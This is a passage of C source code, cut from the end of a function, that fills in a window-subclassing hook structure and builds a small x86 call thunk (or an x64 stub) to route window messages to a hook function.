		pHook->OriginalFn = OriginalFn;
		pHook->HookFn     = HookFn;

		pHook->Context = NULL;
		pHook->WndLong = NULL; // result of getwindowlong after subclassing
		pHook->bIsDialog = FALSE;
		pHook->bIsModal = FALSE;
		pHook->bDeleted = FALSE;
		pHook->bReset = FALSE; // style has been reset
#ifdef _X86_
		pHook->Stub.OpPopEax = OP_POP_EAX;
		pHook->Stub.OpPushDword = OP_PUSH_DWORD;
		pHook->Stub.Ptr = (ULONG)(ULONG_PTR)pHook;
		pHook->Stub.OpPushEax = OP_PUSH_EAX;
		// JMP NEAR XXXX instruction
		pHook->Stub.Jump.Opcode  = JMP_STUB_OPCODE;
		pHook->Stub.Jump.Offset  = (ULONG)((ULONG_PTR)pHook->HookFn - ((ULONG_PTR)&pHook->Stub + sizeof(CALL_STUB)));
		pHook->StubFn = &pHook->Stub;
#else
		pHook->StubFn = x64MakeCallStub(pHook->Stub,HookFn,pHook);
#endif
	}
	return pHook;
}